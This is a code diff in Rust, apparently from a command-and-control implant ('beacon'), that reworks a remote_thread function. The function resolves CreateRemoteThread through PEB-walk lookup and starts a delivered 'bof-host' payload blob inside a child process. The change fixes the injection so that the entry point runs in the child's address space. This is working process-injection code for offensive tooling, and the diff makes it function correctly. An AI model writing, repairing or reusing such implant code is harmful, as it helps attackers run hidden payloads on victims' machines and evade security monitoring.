@@ -289,8 +289,10 @@ struct SecurityAttributes {
 /// Uses Win32 CreateProcessW/CreatePipe via PEB-walk resolution.
 /// Single-threaded beacon context.
 /// `HANDLE CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
-/// LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)` — run `entry` (the
-/// bof-host blob base) in the child with `arg` (payload pointer) as rcx.
+/// LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)` — run `entry` in the
+/// CHILD's address space (the bof-host blob base in the delivered section)
+/// with `arg` (payload pointer) as rcx. The entry must live in the child
+/// (a parent-process thunk would fault — different address spaces).
 pub unsafe fn remote_thread(
     proc_handle: *mut c_void,
     entry: usize,
@@ -308,24 +310,16 @@ pub unsafe fn remote_thread(
         export_addr(b"kernel32.dll", b"CreateRemoteThread")
             .ok_or("CreateRemoteThread unresolved")?,
     );
-    // The thunk needs the real entry address; a static is fine here (this
-    // crate is std; the isolated path is single-threaded).
-    static THUNK_ENTRY: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
-    unsafe extern "system" fn thunk(arg: usize) -> u32 {
-        // The bof-host entry diverges (ExitProcess); if it ever returns,
-        // return 0.
-        let entry_fn: unsafe extern "system" fn(usize) -> ! =
-            core::mem::transmute(THUNK_ENTRY.load(core::sync::atomic::Ordering::SeqCst));
-        unsafe { entry_fn(arg) };
-        0
-    }
-    THUNK_ENTRY.store(entry, core::sync::atomic::Ordering::SeqCst);
+    // bof-host entry is `extern "C" fn(usize) -> !`; the thread routine ABI
+    // (rcx = parameter) matches. It diverges via NtTerminateProcess, so the
+    // "return value" path never runs.
+    let routine: unsafe extern "system" fn(usize) -> u32 = core::mem::transmute(entry);
     let h = unsafe {
         f(
             proc_handle,
             core::ptr::null_mut(),
             0,
-            thunk,
+            routine,
             arg,
             0,
             core::ptr::null_mut(),
